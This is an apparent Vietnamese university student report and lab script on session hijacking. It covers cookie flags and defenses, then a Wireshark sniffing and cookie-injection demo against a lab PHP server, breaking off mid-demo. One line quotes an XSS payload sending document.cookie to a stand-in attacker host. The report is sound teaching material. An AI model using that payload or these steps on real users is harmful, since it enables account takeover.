# BÁO CÁO HỌC THUẬT & KỊCH BẢN THỰC NGHIỆM ĐỒ ÁN AN NINH MẠNG
# CHỦ ĐỀ: TẤN CÔNG CHIẾM QUYỀN ĐIỀU KHIỂN PHIÊN (SESSION HIJACKING)
### Phân tích cơ chế đánh cắp Cookie và chiếm đoạt phiên làm việc trên các giao thức không bảo mật

---

* **Đơn vị đào tạo:** Trường Đại học Giao thông vận tải TP.HCM (UTH) — Khoa Công nghệ Thông tin
* **Học phần:** An ninh mạng / An toàn thông tin
* **Nhóm thực hiện:** **Nhóm 22** (Số lượng: 03 thành viên)
  1. **Phan Nhật Hào** (PH) — Trưởng nhóm / Kỹ thuật Mạng & Hạ tầng Lab
  2. **Đào Duy Quân** (ĐQ) — Kỹ thuật Ứng dụng, Công cụ CEH & Khai thác
  3. **Nguyễn Quang Vinh** (NV) — Giải pháp Phòng thủ, Soạn thảo Báo cáo & Slide
* **Số điện thoại liên hệ nhóm:** 0833386443
* **Tài liệu tham chiếu chuẩn:** EC-Council Certified Ethical Hacker (CEH) v13 — Module 11: *Session Hijacking*

---

## MỤC LỤC TỔNG QUAN

1. [PHẦN I: CƠ SỞ LÝ THUYẾT VÀ KIẾN THỨC CHUYÊN SÂU](#phần-i-cơ-sở-lý-thuyết-và-kiến-thức-chuyên-sâu)
   * [1.1. Bản chất Stateless của giao thức HTTP](#11-bản-chất-stateless-của-giao-thức-http)
   * [1.2. Khái niệm Session và Cookie trong kiến trúc ứng dụng Web](#12-khái-niệm-session-và-cookie-trong-kiến-trúc-ứng-dụng-web)
   * [1.3. Cấu trúc HTTP Header và các cờ bảo mật của Cookie](#13-cấu-trúc-http-header-và-các-cờ-bảo-mật-của-cookie)
   * [1.4. Vòng đời của một phiên làm việc (Session Lifecycle)](#14-vòng-đời-của-một-phiên-làm-việc-session-lifecycle)
   * [1.5. Bản chất Tấn công Session Hijacking (Chuẩn CEH v13)](#15-bản-chất-tấn-công-session-hijacking-chuẩn-ceh-v13)
   * [1.6. Phân biệt cốt lõi: Session Hijacking vs. Session Spoofing](#16-phân-biệt-cốt-lõi-session-hijacking-vs-session-spoofing)
   * [1.7. Phân loại Session Hijacking (Network-Level vs. Application-Level)](#17-phân-loại-session-hijacking-network-level-vs-application-level)
   * [1.8. Tại sao giao thức không bảo mật (HTTP/Telnet/FTP) là "tử huyệt"?](#18-tại-sao-giao-thức-không-bảo-mật-httptelnetftp-là-tử-huyệt)
   * [1.9. Tổng quan bộ công cụ CEH v13 và thực tế (Wireshark, Hetty, CAIDO, OWASP ZAP, Cookie-Editor)](#19-tổng-quan-bộ-công-cụ-ceh-v13-và-thực-tế)
2. [PHẦN II: GIẢI PHÁP PHÒNG CHỐNG TOÀN DIỆN (DEFENSE & MITIGATION)](#phần-ii-giải-pháp-phòng-chống-toàn-diện-defense--mitigation)
   * [2.1. Mã hóa đường truyền bắt buộc với HTTPS (TLS/SSL)](#21-mã-hóa-đường-truyền-bắt-buộc-với-https-tlsssl)
   * [2.2. Thiết lập cờ Cookie bảo mật nghiêm ngặt (HttpOnly, Secure, SameSite)](#22-thiết-lập-cờ-cookie-bảo-mật-nghiêm-ngặt)
   * [2.3. Tái tạo mã phiên sau khi xác thực (Session Regeneration)](#23-tái-tạo-mã-phiên-sau-khi-xác-thực-session-regeneration)
   * [2.4. Quản lý thời gian sống của phiên (Timeouts) và Hủy phiên an toàn](#24-quản-lý-thời-gian-sống-của-phiên-timeouts-và-hủy-phiên-an-toàn)
   * [2.5. Ràng buộc phiên làm việc (Session Binding) và Phát hiện bất thường](#25-ràng-buộc-phiên-làm-việc-session-binding-và-phát-hiện-bất-thường)
3. [PHẦN III: KỊCH BẢN VÀ CÁC BƯỚC DEMO THỰC THI (STEP-BY-STEP LAB DEMO)](#phần-iii-kịch-bản-và-các-bước-demo-thực-thi-step-by-step-lab-demo)
   * [3.1. Mô hình kiến trúc Lab và phân vai thực nghiệm](#31-mô-hình-kiến-trúc-lab-và-phân-vai-thực-nghiệm)
   * [3.2. BƯỚC 1: Thiết lập môi trường Lab (Lab Setup)](#32-bước-1-thiết-lập-môi-trường-lab-lab-setup)
   * [3.3. BƯỚC 2: Thực hiện tấn công trên giao thức HTTP (Exploitation Phase)](#33-bước-2-thực-hiện-tấn-công-trên-giao-thức-http-exploitation-phase)
   * [3.4. BƯỚC 3: Triển khai giải pháp phòng thủ (Defense Implementation)](#34-bước-3-triển-khai-giải-pháp-phòng-thủ-defense-implementation)
   * [3.5. BƯỚC 4: Kiểm tra lại hiệu quả sau khi phòng thủ (Verification Phase)](#35-bước-4-kiểm-tra-lại-hiệu-quả-sau-khi-phòng-thủ-verification-phase)
4. [PHẦN IV: BẢNG PHÂN CÔNG VAI TRÒ & KỊCH BẢN THUYẾT TRÌNH BẢO VỆ](#phần-iv-bảng-phân-công-vai-trò--kịch-bản-thuyết-trình-bảo-vệ)
   * [4.1. Phân công vai trò chi tiết 3 thành viên](#41-phân-công-vai-trò-chi-tiết-3-thành-viên)
   * [4.2. Kịch bản phân vai khi đứng trước Hội đồng Giảng viên](#42-kịch-bản-phân-vai-khi-đứng-trước-hội-đồng-giảng-viên)
5. [PHẦN V: BỘ CÂU HỎI PHẢN BIỆN VẤN ĐÁP CỦA GIẢNG VIÊN VÀ ĐÁP ÁN CHUẨN](#phần-v-bộ-câu-hỏi-phản-biện-vấn-đáp-của-giảng-viên-và-đáp-án-chuẩn)

---

# PHẦN I: CƠ SỞ LÝ THUYẾT VÀ KIẾN THỨC CHUYÊN SÂU

## 1.1. Bản chất Stateless của giao thức HTTP

Giao thức **HTTP (Hypertext Transfer Protocol)** là nền tảng giao tiếp của mạng World Wide Web (WWW). Tuy nhiên, về mặt thiết kế nguyên bản, HTTP là một **giao thức phi trạng thái (Stateless Protocol)**:
* Mỗi một yêu cầu (HTTP Request) từ Client gửi lên Server và phản hồi (HTTP Response) tương ứng được xử lý hoàn toàn độc lập, tách biệt.
* Máy chủ Web (Web Server) sau khi trả lời xong một request sẽ lập tức đóng hoặc giải phóng trạng thái kết nối; Server không hề có bộ nhớ mặc định để nhận diện rằng request số 2 có cùng nguồn gốc với request số 1 hay không.

```
[Client] --- Request 1 (GET /login) ----> [Server] (Không nhớ ai)
[Client] <--- Response 1 (200 OK) -------- [Server]
[Client] --- Request 2 (GET /profile) --> [Server] (Lại coi như người lạ hoàn toàn!)
```

**Hệ quả đối với ứng dụng hiện đại:**
Nếu không có giải pháp duy trì trạng thái, người dùng khi duyệt qua mỗi trang nội bộ (xem điểm thi, chuyển tiền học phí, đổi mật khẩu) sẽ liên tục phải nhập lại Username và Password cho từng cú click chuột. Điều này là bất khả thi về mặt trải nghiệm người dùng (UX).

---

## 1.2. Khái niệm Session và Cookie trong kiến trúc ứng dụng Web

Để khắc phục nhược điểm phi trạng thái của HTTP, các kỹ sư mạng đã phát minh ra giải pháp **Session (Phiên làm việc)** kết hợp với **Cookie**:

```
+-----------------------------------------------------------------------------------+
|                            CƠ CHẾ DUY TRÌ PHIÊN LÀM VIỆC                         |
|                                                                                   |
|   CLIENT (Trình duyệt Nạn nhân)                      SERVER (Cổng UTH Portal)     |
|         |                                                       |                 |
|         | ----- (1) POST /login.php (victim / uth123) --------> | [Xác thực PHP]  |
|         |                                                       | [Khởi tạo       |
|         |                                                       |  Session ID:    |
|         |                                                       |  PHPSESSID]     |
|         | <---- (2) HTTP/1.1 302 Found ------------------------ |                 |
|         |       Set-Cookie: PHPSESSID=b02e9600847bccc441c3...   |                 |
|         |                                                       |                 |
|  [Lưu Cookie                                                    |                 |
|   vào Bộ nhớ                                                    |                 |
|   Cookie Jar]                                                   |                 |
|         |                                                       |                 |
|         | ----- (3) GET /dashboard.php -----------------------> | [Kiểm tra File  |
|         |       Cookie: PHPSESSID=b02e9600847bccc441c3...       |  Session trên   |
|         |                                                       |  Server]        |
|         | <---- (4) HTTP/1.1 200 OK (Trả về trang cá nhân) ---- | [Cho phép vào]  |
|         |                                                       |                 |
+-----------------------------------------------------------------------------------+
```

### Khái niệm Session (Phiên làm việc)
* **Vị trí lưu trữ:** Nằm hoàn toàn ở phía máy chủ (**Server-Side**), được lưu trong RAM, cơ sở dữ liệu (MySQL, PostgreSQL) hoặc cache tốc độ cao (Redis, Memcached).
* **Nội dung:** Lưu trữ toàn bộ thông tin nhạy cảm của người dùng (ID người dùng, quyền hạn Role/Permissions, số dư tài khoản, giỏ hàng, họ tên).
* **Định danh:** Mỗi Session được cấp một chuỗi ngẫu nhiên duy nhất gọi là **Session ID (hoặc Session Token)**.

### Khái niệm Cookie (Bánh quy lưu trữ)
* **Vị trí lưu trữ:** Nằm ở phía trình duyệt người dùng (**Client-Side**).
* **Bản chất:** Là một tập hợp các cặp khóa - giá trị (`Key=Value`) nhỏ (tối đa 4KB) do Server yêu cầu Client lưu trữ thông qua header HTTP phản hồi.
* **Cơ chế hoạt động:** Sau khi được gán, mỗi lần Client gửi request kế tiếp đến cùng Domain/Path, trình duyệt sẽ tự động đính kèm Cookie này lên HTTP Request Header để "chứng minh thân phận" với Server.

---

## 1.3. Cấu trúc HTTP Header và các cờ bảo mật của Cookie

### Header giao tiếp giữa Client và Server
1. **Server gửi về Client:**
   ```http
   HTTP/1.1 200 OK
   Set-Cookie: PHPSESSID=b02e9600847bccc441c369f21ba6d8ad; Path=/; HttpOnly; Secure; SameSite=Strict
   ```
2. **Client tự động gửi lại Server ở các request tiếp theo:**
   ```http
   GET /dashboard.php HTTP/1.1
   Host: 192.168.60.129
   Cookie: PHPSESSID=b02e9600847bccc441c369f21ba6d8ad
   ```

### Bảng phân tích các Cờ thuộc tính (Cookie Flags) quan trọng:

| Thuộc tính / Cờ | Ý nghĩa kỹ thuật | Khả năng phòng thủ |
| :--- | :--- | :--- |
| **`HttpOnly`** | Ngăn chặn mã kịch bản phía Client (JavaScript qua `document.cookie`) đọc giá trị của Cookie. | **Triệt tiêu lỗ hổng XSS đánh cắp Session Cookie.** (Tuy nhiên KHÔNG ngăn được việc bắt gói tin qua Wireshark trên HTTP). |
| **`Secure`** | Chỉ cho phép trình duyệt gửi Cookie này qua kết nối được mã hóa bằng giao thức **HTTPS (TLS/SSL)**. Trình duyệt sẽ từ chối gửi Cookie nếu trang web chạy HTTP cổng 80. | **Ngăn chặn rò rỉ Cookie khi truyền tải qua mạng không bảo mật.** |
| **`SameSite`** | Kiểm soát việc Cookie có được gửi kèm trong các yêu cầu liên trang (Cross-Site Requests) hay không.<br>- `Strict`: Không bao giờ gửi nếu request đến từ domain khác.<br>- `Lax`: Cho phép gửi khi người dùng click link thông thường.<br>- `None`: Cho phép gửi chéo trang (bắt buộc kèm cờ `Secure`). | **Phòng vệ đặc trị cho tấn công Giả mạo yêu cầu chéo trang (CSRF).** |
| **`Path` & `Domain`** | Giới hạn phạm vi URL và Tên miền mà trình duyệt được phép gửi Cookie. | Tránh rò rỉ Cookie sang các subdomain hoặc thư mục không liên quan. |
| **`Expires` / `Max-Age`** | Xác định thời điểm Cookie hết hạn và tự động bị hủy khỏi trình duyệt. | Tránh việc Cookie tồn tại vĩnh viễn trên máy tính người dùng. |

---

## 1.4. Vòng đời của một phiên làm việc (Session Lifecycle)

Một phiên làm việc chuẩn trải qua 4 giai đoạn cơ bản:
1. **Khởi tạo (Creation):** Người dùng gửi thông tin xác thực (Credentials) đúng. Server khởi tạo session object và phát sinh `Session ID`.
2. **Duy trì (Maintenance):** Mỗi request sau đó đều kèm theo Session ID. Server đối chiếu Session ID với Session Store để xác định danh tính.
3. **Cập nhật / Tái sinh (Regeneration):** Đổi sang Session ID mới khi có sự thay đổi đặc quyền (ví dụ: chuyển từ trạng thái Khách sang Đăng nhập thành công, hoặc khi nâng quyền Admin).
4. **Hủy phiên (Termination / Invalidation):** Khi người dùng bấm Đăng xuất (Logout) hoặc khi hết thời gian chờ (Timeout), Server phải xóa bản ghi Session trong kho lưu trữ, đồng thời yêu cầu Client xóa Cookie tương ứng.

---

## 1.5. Bản chất Tấn công Session Hijacking (Chuẩn CEH v13)

Theo giáo trình **EC-Council Certified Ethical Hacker (CEH) v13 - Module 11**:
> **"Session Hijacking is the exploitation of a valid computer session to gain unauthorized access to information or services in a computer system."**
> *(Tấn công chiếm quyền điều khiển phiên là hành vi khai thác một phiên làm việc hợp lệ đang hoạt động để chiếm quyền truy cập trái phép vào thông tin hoặc dịch vụ trên hệ thống.)*

```
                                +-------------------+
                                |    WEB SERVER     |
                                +-------------------+
                                   ^             ^
                   (Phiên hợp lệ)  |             | (Chiếm phiên thành công)
                  PHPSESSID=ABC    |             | PHPSESSID=ABC
                                   v             v
       +-----------------------+                    +------------------------+
       |   VICTIM (Nạn nhân)   |                    |   ATTACKER (Kẻ xấu)    |
       |  Đăng nhập hợp pháp   |                    |  Không cần Password    |
       +-----------------------+                    +------------------------+
                  |                                              ^
                  +-------- Bị nghe lén / Trích xuất ------------+
```

### Điểm đặc thù của Session Hijacking:
1. **Bỏ qua bước xác thực mật khẩu:** Kẻ tấn công **hoàn toàn không cần biết mật khẩu (password)**, không cần bẻ khóa mã hash, không cần vượt qua cơ chế CAPTCHA hay OTP. Kẻ tấn công chỉ cần lấy được chuỗi **Session ID / Cookie** hợp lệ của nạn nhân.
2. **Kế thừa toàn bộ quyền hạn:** Một khi đã chèn Cookie vào trình duyệt của mình, Server sẽ đối xử với Attacker y hệt như với Nạn nhân thật (toàn quyền xem thông tin, chỉnh sửa hồ sơ, chuyển khoản).

---

## 1.6. Phân biệt cốt lõi: Session Hijacking vs. Session Spoofing

Đây là câu hỏi thường xuyên xuất hiện trong các kỳ thi chứng chỉ CEH và các buổi bảo vệ đồ án trước Hội đồng Giảng viên:

| Tiêu chí | Session Hijacking (Chiếm quyền phiên) | Session Spoofing (Mạo danh phiên) |
| :--- | :--- | :--- |
| **Trạng thái kết nối** | **Đang tồn tại một phiên làm việc hợp lệ và đang hoạt động (Active Session).** Nạn nhân đã đăng nhập vào hệ thống. | **Chưa có phiên làm việc của nạn nhân.** Kẻ tấn công chủ động khởi tạo một kết nối mới hoàn toàn. |
| **Bản chất hành động** | Kẻ tấn công "chen ngang" vào luồng kết nối, cướp lấy Session ID đang sống và tiếp quản quyền điều khiển của nạn nhân. | Kẻ tấn công giả mạo danh tính (giả mạo địa chỉ IP, địa chỉ MAC) để lừa Server cấp phiên mới cho mình dưới danh nghĩa nạn nhân. |
| **Sự can thiệp nạn nhân** | Nạn nhân thường bị mất đồng bộ, văng kết nối (ở Network-level) hoặc không hề hay biết phiên của mình đang bị dùng song song (ở Application-level). | Nạn nhân không cần phải trực tuyến (online) tại thời điểm kẻ tấn công thực hiện mạo danh. |

---

## 1.7. Phân loại Session Hijacking (Network-Level vs. Application-Level)

Theo CEH v13, kỹ thuật Session Hijacking được chia làm 2 tầng kiến trúc:

```
                          SESSION HIJACKING
                                 |
         +-----------------------+-----------------------+
         |                                               |
  NETWORK-LEVEL HIJACKING                       APPLICATION-LEVEL HIJACKING
  (Tầng mạng / Tầng giao vận)                   (Tầng ứng dụng Web)
  - TCP/IP Packet Hijacking                     - HTTP Plaintext Sniffing (Đề tài Nhóm 22)
  - RST / FIN Packet Injection                  - Cross-Site Scripting (XSS cướp Cookie)
  - Man-in-the-Middle (ARP Spoofing)            - Session Fixation (Cố định phiên)
  - Blind Hijacking                             - Session Token Prediction (Dự đoán token)
```

### 1. Network-Level Session Hijacking (Tầng Mạng - Layer 3 & Layer 4)
* Can thiệp vào các gói tin TCP/IP, tấn công vào quá trình bắt tay 3 bước (TCP 3-way Handshake).
* **Kỹ thuật:** Kẻ tấn công dự đoán số thứ tự tuần tự của gói tin (**TCP Sequence Numbers - SEQ/ACK**), gửi gói tin RST (Reset) để ngắt kết nối của nạn nhân, sau đó giả mạo địa chỉ IP để bơm dữ liệu vào phiên TCP đang mở với Server.

### 2. Application-Level Session Hijacking (Tầng Ứng dụng - Layer 7) — Trọng tâm Đề tài Nhóm 22
* Tập trung trực tiếp vào **Session ID / Cookie** quản lý người dùng của các ứng dụng Web HTTP.
* Các phương thức đánh cắp chính:
  1. **HTTP Plaintext Sniffing (Nghe lén đường truyền không bảo mật):** Bắt trực tiếp gói tin truyền qua mạng LAN/Wi-Fi khi ứng dụng chạy HTTP port 80.
  2. **Cross-Site Scripting (XSS):** Tiêm mã độc JavaScript (`fetch('http://attacker.com/steal?cookie=' + document.cookie)`) để gửi trộm Cookie về máy kẻ tấn công.
  3. **Session Fixation (Cố định phiên):** Kẻ tấn công ép trình duyệt nạn nhân sử dụng một Session ID do hắn chỉ định sẵn trước khi nạn nhân đăng nhập.
  4. **Session Prediction (Dự đoán phiên):** Nếu Session ID sinh ra theo quy luật đơn giản (ví dụ: `USER_001`, `USER_002` hoặc mã hóa base64 theo thời gian), kẻ tấn công có thể đoán trước ID của người dùng tiếp theo.

---

## 1.8. Tại sao giao thức không bảo mật (HTTP/Telnet/FTP) là "tử huyệt"?

Các giao thức cổ điển như **HTTP (port 80)**, **Telnet (port 23)**, **FTP (port 21)** được phát minh từ thời kỳ sơ khai của Internet, khi các kỹ sư giả định rằng môi trường mạng là hoàn toàn đáng tin cậy. Chúng mắc phải 3 "tử huyệt" chí mạng:

1. **Truyền tin dạng rõ (Cleartext / Plaintext):**
   * Toàn bộ dữ liệu — từ URL, form POST chứa mật khẩu, đến các trường Header nhạy cảm như `Cookie: ...` và `Authorization: ...` — đều được gửi đi dưới dạng chuỗi ký tự ASCII trần trụi.
   * Bất kỳ thiết bị trung gian nào trên đường truyền (Switch, Router, Access Point Wi-Fi) hoặc bất kỳ ai trong cùng mạng LAN đều có thể đọc trọn vẹn nội dung này.
2. **Không có tính toàn vẹn (No Data Integrity):**
   * Gói tin không có chữ ký số (Digital Signature) hay mã xác thực thông điệp (HMAC). Kẻ tấn công có thể sửa đổi nội dung gói tin trên đường truyền mà bên nhận không hề hay biết.
3. **Không có xác thực hai chiều (No Mutual Authentication):**
   * Người dùng không có cách nào xác minh mình đang kết nối đến đúng Server thật hay đang nói chuyện với một máy chủ giả mạo đứng giữa (Man-in-the-Middle).

> ⚠️ **Kết luận thực tiễn:** Trong một mạng Wi-Fi quán cà phê hoặc mạng nội bộ trường học/doanh nghiệp chạy giao thức HTTP không bảo mật, chỉ cần một máy tính bật chế độ lắng nghe (Promiscuous Mode) là có thể thu thập hàng loạt Cookie của những người dùng xung quanh!

---

## 1.9. Tổng quan bộ công cụ CEH v13 và thực tế

Trong khuôn khổ môn học và đồ án, nhóm sử dụng bộ công cụ tiêu chuẩn quốc tế:

1. **Wireshark (Network Sniffer hàng đầu):**
   * Công cụ phân tích giao thức mạng chuyên sâu.
   * Dùng để "bắt sống" các gói tin HTTP Request/Response truyền trên card mạng, lọc chính xác chuỗi `PHPSESSID` bằng mắt thường.
2. **CAIDO (Modern Web Security Intercepting Proxy):**
   * Bộ công cụ kiểm thử bảo mật thế hệ mới viết bằng Rust, siêu nhẹ, tiết kiệm RAM.
   * Cho phép chặn bắt (intercept), kiểm tra lịch sử HTTP Requests, và tái tạo request (Replay Engine) để khai thác session cookie.
3. **Hetty (Lightweight Go-based HTTP Toolkit):**
   * Công cụ proxy MITM viết bằng Go tích hợp sẵn giao diện Web Admin cực kỳ tối giản.
   * Giúp sinh viên quan sát trực quan luồng dữ liệu HTTP mà không cần cấu hình nặng nề.
4. **OWASP ZAP (Zed Attack Proxy):**
   * Bộ công cụ kiểm thử thâm nhập nguồn mở của OWASP. Hỗ trợ quét tự động lỗ hổng Cookie flags, phân tích độ ngẫu nhiên của token (Token Entropy).
5. **Cookie-Editor (Browser Extension):**
   * Tiện ích mở rộng trên Chrome/Firefox/Edge giúp thêm, sửa, xóa, nạp cookie vào trình duyệt một cách trực quan, phục vụ đắc lực cho việc quay video và trình diễn demo trực tiếp.

---

# PHẦN II: GIẢI PHÁP PHÒNG CHỐNG TOÀN DIỆN (DEFENSE & MITIGATION)

Để đồ án đạt điểm tối đa, nhóm không chỉ dừng lại ở việc tấn công mà phải đưa ra và chứng minh các giải pháp khắc phục chuẩn công nghiệp:

## 2.1. Mã hóa đường truyền bắt buộc với HTTPS (TLS/SSL)

* **Bản chất:** Bọc thêm lớp bảo mật tầng giao vận (Transport Layer Security - TLS) bên ngoài giao thức HTTP.
* **Cơ chế:** Dữ liệu HTTP Header (bao gồm `Cookie: ...`) và Body được mã hóa đối xứng bằng thuật toán mạnh (như AES-GCM 256-bit hoặc ChaCha20-Poly1305).
* **Kết quả đối kháng:** Kẻ tấn công bắt gói tin trên Wireshark chỉ nhìn thấy các khối dữ liệu ngẫu nhiên vô nghĩa (**TLS Application Data**), hoàn toàn không thể đọc được Session Token.
* **Cấu hình kèm theo:** Kích hoạt **HSTS (HTTP Strict Transport Security)** để ép trình duyệt luôn luôn dùng HTTPS, chống lại các đòn tấn công hạ cấp giao thức (SSL Stripping).

## 2.2. Thiết lập cờ Cookie bảo mật nghiêm ngặt

Mọi Cookie đóng vai trò quản lý phiên bắt buộc phải được thiết lập 3 cờ then chốt:

```ini
; Cấu hình chuẩn trong /etc/php/*/apache2/php.ini trên Apache2 Server
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Strict"
```

```php
// Hoặc thiết lập bằng code PHP trước khi gọi session_start()
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

1. **`HttpOnly`:** Ngăn chặn hoàn toàn JavaScript của trình duyệt truy cập `document.cookie`. Nếu web có dính lỗ hổng XSS, kẻ tấn công cũng không thể đánh cắp được Session Cookie.
2. **`Secure`:** Ép buộc Cookie chỉ được truyền qua kênh kết nối đã mã hóa HTTPS. Trình duyệt sẽ từ chối gửi Cookie nếu trang web chạy HTTP cleartext.
3. **`SameSite=Strict`:** Chống tấn công CSRF (Cross-Site Request Forgery), ngăn trình duyệt tự động gửi cookie khi có request xuất phát từ trang web bên ngoài.

## 2.3. Tái tạo mã phiên sau khi xác thực (Session Regeneration)

* **Vấn đề (Session Fixation):** Kẻ tấn công có thể tạo sẵn một session ID rồi gửi link dụ nạn nhân bấm vào đăng nhập. Nếu Server giữ nguyên session ID đó sau khi đăng nhập, kẻ tấn công sẽ dùng chính ID đó để vào tài khoản nạn nhân.
* **Giải pháp:** Bắt buộc phải **hủy bỏ Session ID cũ và cấp phát một Session ID hoàn toàn mới** ngay sau thời điểm người dùng nhập đúng thông tin đăng nhập thành công.

## 2.4. Quản lý thời gian sống của phiên (Timeouts) và Hủy phiên an toàn

1. **Idle Timeout (Thời gian chờ không hoạt động):** Nếu người dùng không có thao tác gì sau một khoảng thời gian (ví dụ: 15 phút với ứng dụng ngân hàng, 60 phút với cổng sinh viên), phiên làm việc tự động hết hạn.
2. **Absolute Timeout (Thời gian tối đa):** Phiên làm việc bắt buộc phải kết thúc sau một khoảng thời gian cố định (ví dụ: 8 tiếng hoặc 24 tiếng) kể từ lúc đăng nhập, bất kể người dùng có đang thao tác hay không.
3. **Proper Termination on Logout:** Khi người dùng nhấn nút "Đăng xuất" (Logout):
   * Phía Server: Xóa hoàn toàn bản ghi phiên trong RAM/Database (`delete sessions[token]`).
   * Phía Client: Gửi header `Set-Cookie` với ngày hết hạn trong quá khứ (`Expires=Thu, 01 Jan 1970 00:00:00 GMT`) để xóa Cookie trên trình duyệt.

## 2.5. Ràng buộc phiên làm việc (Session Binding) và Phát hiện bất thường

* **Kỹ thuật:** Ràng buộc Session ID với các thông số nhận dạng phần cứng/môi trường của Client như địa chỉ IP, User-Agent, TLS Fingerprint.
* **Kiểm tra khi nhận request:** Nếu một Session ID vốn được khởi tạo từ IP tại TP.HCM (Việt Nam) với User-Agent là Firefox/Windows mà đột ngột xuất hiện request cùng Session ID đó đến từ IP nước ngoài với User-Agent là Chrome/Mac, hệ thống sẽ lập tức gắn cờ nghi vấn, thu hồi phiên và yêu cầu xác thực lại qua OTP (Two-Factor Authentication).

---

# PHẦN III: KỊCH BẢN VÀ CÁC BƯỚC DEMO THỰC THI (STEP-BY-STEP LAB DEMO)

Kịch bản demo được thiết kế bám sát đúng 4 bước yêu cầu trong Quy định Bài tập lớn của Khoa CNTT - UTH và bộ mã nguồn PHP/Apache2 tại thư mục `Nhom22_SessionHijacking/SOURCE/`.

---

## 3.1. Mô hình kiến trúc Lab và phân vai thực nghiệm

```text
+---------------------------------------------------------------------------------------+
|                   MÔ HÌNH PHÒNG THỬ NGHIỆM LAB TRÊN VMWARE WORKSTATION                |
|                                                                                       |
|      +-------------------------------------------------------------------------+      |
|      |         MÁY CHỦ ỨNG DỤNG WEB — Target-Web-Server (VMware VM)            |      |
|      |         - Dịch vụ: Apache2 + PHP (/var/www/html/*.php)                  |      |
|      |         - Địa chỉ IP: 192.168.60.129                                    |      |
|      |         - Giao thức: HTTP cổng 80 (Lỗ hổng) / HTTPS cổng 443 (Phòng thủ)|      |
|      +-------------------------------------------------------------------------+      |
|                           /                                       \                   |
|                          / (Đăng nhập HTTP)                        \ (Bắt Cookie &    |
|                         /                                           \  Bơm Cookie)    |
|                        v                                             v                |
|      +-----------------------------------+         +--------------------------------+ |
|      |   MÁY NẠN NHÂN (Host Windows)     |         |   MÁY TẤN CÔNG (VM Kali Linux) | |
|      | - IP: 192.168.60.1                |         | - Image: kali-linux-2026.3     | |
|      | - Trình duyệt: Google Chrome      | <====== | - Trình duyệt: Firefox + F12   | |
|      | - Tài khoản: victim / uth123      |         |   Storage / Cookie-Editor      | |
|      | - Nắm giữ thông tin cá nhân & ví  |         | - Công cụ mạng: Wireshark      | |
|      +-----------------------------------+         +--------------------------------+ |
|                                                                                       |
+---------------------------------------------------------------------------------------+
```

---

## 3.2. BƯỚC 1: Thiết lập môi trường Lab (Lab Setup)

### 1. Khởi động máy ảo `Target-Web-Server` & dịch vụ Apache2 + PHP
Trên VMware Workstation Pro, bật máy ảo `Target-Web-Server` (IP `192.168.60.129`), kiểm tra mã nguồn và trạng thái Web Server:
```bash
sudo cp login.php dashboard.php logout.php /var/www/html/
sudo systemctl enable --now apache2
ip a
```
* **Kết quả:** Apache2 lắng nghe tại `http://192.168.60.129/login.php` ở chế độ HTTP cổng 80 (chưa bật SSL và `session.cookie_httponly` đang tắt).

### 2. Chuẩn bị máy Nạn nhân & máy Tấn công (`kali-linux-2026.3-vmware-amd64`)
1. **Máy Nạn nhân (Host Windows):** Google Chrome.
2. **Máy Tấn công (VM Kali Linux):** Trình duyệt **Firefox** (F12 Storage / Cookie-Editor) hoàn toàn chưa đăng nhập.
3. **Mở Wireshark trên Kali Linux:**
   ```bash
   sudo wireshark
   ```
   Chọn bắt gói tin trên card mạng **`eth0`**.

---

## 3.3. BƯỚC 2: Thực hiện tấn công trên giao thức HTTP (Exploitation Phase)

### Pha 1: Nạn nhân đăng nhập hợp lệ vào hệ thống
1. Trên **Google Chrome (Host Windows)**, truy cập: `http://192.168.60.129/login.php`
2. Quan sát thấy giao diện mang huy hiệu đỏ: `⚠️ GIAO THỨC KHÔNG BẢO MẬT: HTTP (Port 80)`.
3. Nhập thông tin tài khoản mẫu:
   * **Username:** `victim`
   * **Password:** `uth123`
   * Nhấn nút **Đăng nhập**.
4. Trình duyệt chuyển hướng vào trang `http://192.168.60.129/dashboard.php`:
   * Hiển thị đầy đủ thông tin bí mật:
     * Họ tên: **Nguyễn Văn Nạn Nhân (Sinh viên UTH)**
     * Mã số SV: **2251120000**
     * Tài khoản ngân hàng: **0833386443**
     * Số dư ví học phí: **25.000.000 VNĐ**
   * Server đã gửi về header: `Set-Cookie: PHPSESSID=<chuỗi_session_id>; path=/` (không có `HttpOnly` hay `Secure`).

---

### Pha 2: Kẻ tấn công bắt gói tin và trích xuất Session Cookie

#### Cách 1: Sử dụng Wireshark (Phân tích gói tin mạng thô)
1. Trong Wireshark trên Kali Linux, gõ bộ lọc (Display Filter):
   ```wireshark
   http.cookie contains "PHPSESSID"
   ```
2. Quan sát gói tin `GET /dashboard.php HTTP/1.1`:
3. Bấm chuột phải vào gói tin -> chọn **Follow** -> **HTTP Stream**:
   * Nhìn thấy toàn bộ chuỗi Header truyền dưới dạng **plaintext**:
     ```http
     GET /dashboard.php HTTP/1.1
     Host: 192.168.60.129
     User-Agent: Mozilla/5.0 ...
     Accept: text/html...
     Cookie: PHPSESSID=b02e9600847bccc441c369f21ba6d8ad
     ```
   * 👉 **Attacker copy được giá trị Cookie:** `b02e9600847bccc441c369f21ba6d8ad`.

#### Cách 2: Kiểm tra thuộc tính Cookie trên F12 DevTools
* Trong tab **Application > Cookies** (Chrome) hoặc **Storage > Cookies** (Firefox):
  * Tên Cookie: `PHPSESSID`
  * Giá trị: `b02e9600847bccc441c369f21ba6d8ad`
  * Thuộc tính `HttpOnly`: **Trống / False**
  * Thuộc tính `Secure`: **Trống / False**

---

### Pha 3: Chiếm quyền phiên (Session Hijacking & Cookie Injection)

1. Mở **Firefox trên máy ảo Kali Linux (Attacker)**.
2. Thử truy cập thẳng vào trang nội bộ: `http://192.168.60.129/dashboard.php`
   * **Kết quả:** Server lập tức đá văng về `http://192.168.60.129/login.php?error=unauthorized`.
   * *Chứng minh:* Attacker hiện tại không có quyền truy cập.
3. Nhấn `F12` -> chọn tab **Storage** -> chọn mục **Cookies** -> `http://192.168.60.129` (hoặc dùng extension **Cookie-Editor**):
   * Nhấn nút dấu cộng **(+) Add**:
     * **Name:** `PHPSESSID`
     * **Value:** `b02e9600847bccc441c369f21ba6d8ad` *(dán giá trị vừa bắt từ Wireshark)*
     * **Path:** `/`
4. Đổi lại thanh địa chỉ thành **`http://192.168.60.129/dashboard.php`** và nhấn **Enter**:
   * 💥 **BÙNG NỔ KẾT QUẢ:** Trang web lập tức hiển thị toàn bộ trang cá nhân của Nạn nhân:
